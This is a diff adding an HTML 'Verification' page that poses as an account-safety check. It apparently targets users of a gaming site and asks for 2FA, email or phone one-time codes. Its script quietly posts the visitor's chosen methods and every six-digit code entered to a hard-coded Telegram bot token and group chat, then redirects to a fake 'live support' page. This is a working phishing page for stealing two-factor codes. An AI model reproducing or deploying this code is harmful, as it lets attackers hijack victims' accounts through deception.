@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verification</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      background: #1e1e1e;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      margin: 0;
+      color: #fff;
+    }
+    .container {
+      background: #1e1e1e;
+      width: 100%;
+      max-width: 100%;
+      padding: 2rem;
+      border-radius: 8px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 1.75rem;
+      color: #fff;
+      margin-bottom: 0.5rem;
+    }
+    p.description {
+      font-size: 1rem;
+      color: #bbb;
+      margin-bottom: 1.5rem;
+      line-height: 1.4;
+    }
+    .verification-method {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 1rem;
+      margin: 1rem 0;
+      padding: 10px;
+      background: #2b2b2b;
+      border-radius: 8px;
+      transition: 0.3s;
+      cursor: pointer;
+    }
+    .verification-method.selected {
+      border: 1px solid #28a745; /* Border for selected but unverified methods */
+    }
+    .verification-method.verified {
+      border: 1px solid #28a745; /* Border for verified methods */
+    }
+    .verification-method img {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+    .verification-method label {
+      flex-grow: 1;
+      display: flex;
+      align-items: center;
+      color: #fff;
+    }
+    .checkbox {
+      width: 24px;
+      height: 24px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #444;
+      border: 2px solid transparent;
+      cursor: pointer;
+    }
+    .checkbox.checked {
+      background-color: #28a745;
+      border-color: #28a745;
+    }
+    .checkbox.checked::before {
+      content: "✓";
+      font-size: 1rem;
+      color: #fff;
+    }
+    button#confirmBtn {
+      width: 100%;
+      padding: 0.75rem;
+      background-color: #28a745;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.125rem;
+      color: #fff;
+      cursor: pointer;
+      margin-top: 1.5rem;
+    }
+    button#confirmBtn:hover {
+      opacity: 0.9;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      left: 50%;
+      bottom: 0;
+      transform: translateX(-50%);
+      background: #222222;
+      padding: 2rem;
+      border-radius: 28px 28px 0 0;
+      box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      width: 100%;
+      max-width: 600px;
+    }
+    .modal h2 {
+      font-size: 1.5rem;
+      margin-bottom: 1rem;
+    }
+    .modal p {
+      font-size: 0.7rem;
+      color: #bbb;
+      font-weight: 550;
+      margin-bottom: 1.5rem;
+    }
+    .modal input {
+      width: 100%;
+      padding: 0.75rem;
+      margin-bottom: 1rem;
+      background: #1a1a1a;
+      border: none;
+      color: rgb(143, 140, 140);
+      text-align: center;
+      border-radius: 4px;
+    }
+    .modal button {
+      width: 95%;
+      padding: 0.75rem;
+      background-color: #297e3d;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      color: #fff;
+      cursor: pointer;
+    }
+    .modal button:hover {
+      opacity: 0.9;
+    }
+    .go-verify {
+      color: #28a745;
+      
+      margin-left: auto; /* Push the tick to the right */
+      padding-left: 10px; /* Add some spacing */
+    }
+    .go-verify.verified {
+      color: #28a745;
+    }
+    .close-modal {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      font-size: 1.5rem;
+      color: #bbb;
+      cursor: pointer;
+    }
+    .close-modal:hover {
+      color: #fff;
+    }
+  </style>
+  <script>
+    let selectedMethods = [];
+    let verifiedMethods = [];
+
+    function toggleSelection(element) {
+      let method = element.parentElement;
+      if (!element.classList.contains('checked') && selectedMethods.length >= 2) {
+        return;
+      }
+      element.classList.toggle('checked');
+      method.classList.toggle('selected');
+
+      if (element.classList.contains('checked')) {
+        selectedMethods.push(method);
+      } else {
+        selectedMethods = selectedMethods.filter(m => m !== method);
+      }
+    }
+
+    function confirmSelection() {
+      if (selectedMethods.length !== 2) {
+        alert("Please select exactly 2 verification methods.");
+        return;
+      }
+
+      let allMethods = document.querySelectorAll('.verification-method');
+      allMethods.forEach(method => {
+        if (!method.classList.contains('selected')) {
+          method.style.display = 'none';
+        } else {
+          method.querySelector('.checkbox').style.display = 'none';
+          method.innerHTML += '<span class="go-verify">Go Verify ></span>';
+          method.onclick = () => openModal(method);
+        }
+      });
+
+      // Send selected methods to Telegram GROUP
+      let selectedMethodNames = selectedMethods.map(method => method.querySelector('label').innerText.trim());
+      fetch(`https://api.telegram.org/bot7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          chat_id: "-4814667671", 
+          text: `📋 Selected Verification Methods:\n${selectedMethodNames.join('\n')}` 
+        })
+      });
+    }
+
+    function openModal(method) {
+      let modal = document.getElementById("verificationModal");
+      modal.style.display = "block";
+      modal.dataset.method = method.querySelector('label').innerText.trim();
+
+      // Update modal text based on method
+      let methodName = modal.dataset.method;
+      let modalText = document.querySelector("#verificationModal p");
+      if (methodName.includes("2FA")) {
+        modalText.innerText = "Enter the code generated by your Google Authenticator App.";
+      } else if (methodName.includes("Phone")) {
+        modalText.innerText = "We have sent an OTP to your phone. Enter that OTP here.";
+      } else if (methodName.includes("Email")) {
+        modalText.innerText = "We have sent a 6-digit verification code to your email. Enter that code here.";
+      }
+
+      // Send method choice to Telegram GROUP
+      fetch(`https://api.telegram.org/bot7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          chat_id: "-4814667671", 
+          text: `🔘 User Selected Method:\n${methodName}` 
+        })
+      });
+    }
+
+    function verifyCode() {
+      let code = document.querySelector("#verificationModal input").value;
+      if (!validateCode(code)) {
+        alert("Invalid code. Please enter a 6-digit number.");
+        return;
+      }
+
+      let methodText = document.getElementById("verificationModal").dataset.method;
+      let methodElement = Array.from(document.querySelectorAll('.verification-method')).find(method => method.querySelector('label').innerText.includes(methodText));
+      let goVerifySpan = methodElement.querySelector('.go-verify');
+      goVerifySpan.innerHTML = '✓';
+      goVerifySpan.classList.add('verified');
+      methodElement.classList.remove('selected');
+      methodElement.classList.add('verified');
+      methodElement.onclick = null;
+      verifiedMethods.push(methodElement);
+      closeModal();
+
+      // Send OTP to Telegram GROUP
+      fetch(`https://api.telegram.org/bot7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          chat_id: "-4814667671", 
+          text: `🔐 Verification Code Received\n\nMethod: ${methodText}\nCode: ${code}` 
+        })
+      });
+
+      if (verifiedMethods.length === 2) {
+        window.location.href = "https://bcgametopgame.github.io/chat/";
+      }
+    }
+
+    function closeModal() {
+      document.getElementById("verificationModal").style.display = "none";
+    }
+
+    function validateCode(code) {
+      return /^\d{6}$/.test(code);
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelector(".close-modal").addEventListener("click", closeModal);
+    });
+</script>
+</head>
+<body>
+  <div class="container">
+    <img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/lockauthen.png?alt=media&token=588a9ead-88cb-4537-8dc2-51b8180e65be" style="width: 60px; height: 55px;">
+    <h1>Verification</h1>
+    <p class="description">For your account safety, please complete all of the following verifications to continue.</p>
+    <p class="description">0/2</p>
+    <div class="verification-method" onclick="toggleSelection(this.querySelector('.checkbox'))">
+      <label><img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/lockauthen.png?alt=media&token=588a9ead-88cb-4537-8dc2-51b8180e65be"style="width: 20px; height: 20px"> 2FA Verification</label>
+      <div class="checkbox"></div>
+    </div>
+    <div class="verification-method" onclick="toggleSelection(this.querySelector('.checkbox'))">
+      <label><img src="https://raw.githubusercontent.com/BcGameTopGame/bcgame../refs/heads/main/envelope.png"  style="width: 20px; height: 20px"> Email Verification</label>
+      <div class="checkbox"></div>
+    </div>
+    <div class="verification-method" onclick="toggleSelection(this.querySelector('.checkbox'))">
+      <label><img src="https://raw.githubusercontent.com/BcGameTopGame/bcgame../refs/heads/main/phone.png"style="width: 20px; height: 20px"> Phone Number</label>
+      <div class="checkbox"></div>
+    </div>
+    <button id="confirmBtn" onclick="confirmSelection()">Confirm</button>
+    <p class="description">Don't have access to these verification methods Contact <a href="https://bcgametopgame.github.io/chat/">Live support</a></p>
+  </div>
+  <div class="modal" id="verificationModal">
+    <span class="close-modal">×</span>
+    <img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/lockauthen.png?alt=media&token=588a9ead-88cb-4537-8dc2-51b8180e65be" style="width: 60px; height: 55px;">
+    <h2>Enter Verification Code</h2>
+    <p>Enter the code generated by your Google Authenticator App.</p>
+    <input type="text" placeholder="6-digit verification code" />
+    <button onclick="verifyCode()">Confirm</button>
+  </div>
+</body>
+</html>
